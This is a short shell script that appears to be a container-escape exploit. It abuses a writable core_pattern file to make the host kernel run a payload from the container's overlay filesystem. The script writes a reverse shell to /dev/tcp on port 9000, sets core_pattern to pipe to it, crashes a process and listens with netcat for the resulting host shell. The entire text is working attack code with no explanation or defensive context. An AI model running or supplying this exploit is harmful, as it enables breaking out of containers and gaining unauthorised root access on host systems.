#!/bin/sh
OVERLAY_PATH=$(cat /proc/mounts | grep -oe upperdir="[^,]*," | cut -d = -f 2 | tr -d , | head -n 1)
REVERSE_IP=$(hostname -I | tr -d " ") && echo '#!/bin/sh' > /tmp/shell.sh
echo "sh -i >& /dev/tcp/${REVERSE_IP}/9000 0>&1" >> /tmp/shell.sh && chmod a+x /tmp/shell.sh
cd /sysproc  #replace with the mountpoint of /proc/sys/kernel in your container
echo "|$OVERLAY_PATH/tmp/shell.sh" > core_pattern
cd /
sleep 5 && ./crash & nc -l -vv -p 9000
whoami
